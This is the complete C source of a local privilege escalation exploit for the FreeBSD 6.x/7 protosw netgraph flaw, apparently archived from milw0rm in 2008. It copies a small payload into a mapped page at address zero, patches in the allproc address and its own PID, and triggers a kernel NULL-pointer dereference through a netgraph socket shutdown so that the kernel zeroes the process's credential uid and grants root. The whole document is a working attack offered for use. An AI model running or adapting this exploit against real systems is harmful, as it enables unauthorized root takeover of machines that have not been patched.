<html><head><title>FreeBSD 6x/7 protosw kernel Local Privledge Escalation Exploit</title></head><pre>/*
 * This is a quick and very dirty exploit for the FreeBSD protosw vulnerability
 * defined here: 
 * http://security.freebsd.org/advisories/FreeBSD-SA-08:13.protosw.asc
 *
 * This will overwrite your credential structure in the kernel. This will 
 * affect more than just the exploit's process, which is why this doesn't
 * spawn a shell. When the exploit has finished, your login shell should
 * have euid=0. 
 *
 * Enjoy, and happy holidays!
 *  - Don &quot;north&quot; Bailey (don.bailey@gmail.com) 12/25/2008
 */

#include &lt;sys/mman.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netgraph/ng_socket.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;

#define PAGES 1
#define PATTERN1 0x8f8f8f8f
#define PATTERN2 0x6e6e6e6e

typedef unsigned long ulong;
typedef unsigned char uchar;

int
x(void)
{
	struct proc * p = (struct proc * )PATTERN1;
	uint * i;

	while(1)
	{
		if(p-&gt;p_pid == PATTERN2)
		{
			i = (uint * )p-&gt;p_ucred;
			*++i = 0;
			break;
		}

		p = p-&gt;p_list.le_next;
	}

	return 1;
}

int
main(int argc, char * argv[])
{
	ulong addr;
	uchar * c;
	uchar * d;
	uint * i;
	void * v;
	int pid;
	int s;

	if(argc != 2)
	{
		fprintf(stderr, &quot;usage: ./x &lt;allproc&gt;\n&quot;);
		return 1;
	}

	addr = strtoul(argv[1], 0, 0);

	v = mmap(
		NULL,
		(PAGES*PAGE_SIZE),
		PROT_READ|PROT_WRITE|PROT_EXEC, 
		MAP_ANON|MAP_FIXED, 
		-1, 
		0);
	if(v == MAP_FAILED)
	{
		perror(&quot;mmap&quot;);
		return 0;
	}

	c = v;
	d = (uchar * )x;
	while(1)
	{
		*c = *d;
		if(*d == 0xc3)
		{
			break;
		}

		d++;
		c++;
	}

	*c++ = 0xc3;

	c = v;
	while(1)
	{
		if(*(long * )c == PATTERN1)
		{
			*(c + 0) = addr &gt;&gt;  0;
			*(c + 1) = addr &gt;&gt;  8;
			*(c + 2) = addr &gt;&gt; 16;
			*(c + 3) = addr &gt;&gt; 24;
			break;
		}
		c++;
	}

	pid = getpid();
	while(1)
	{
		if(*(long * )c == PATTERN2)
		{
			*(c + 0) = pid &gt;&gt;  0;
			*(c + 1) = pid &gt;&gt;  8;
			*(c + 2) = pid &gt;&gt; 16;
			*(c + 3) = pid &gt;&gt; 24;
			break;
		}
		c++;
	}

	s = socket(PF_NETGRAPH, SOCK_DGRAM, NG_DATA);
	if(s &lt; 0)
	{
		perror(&quot;socket&quot;);
		return 1;
	}

	shutdown(s, SHUT_RDWR);

	return 0;
}

// milw0rm.com [2008-12-28]</pre></html>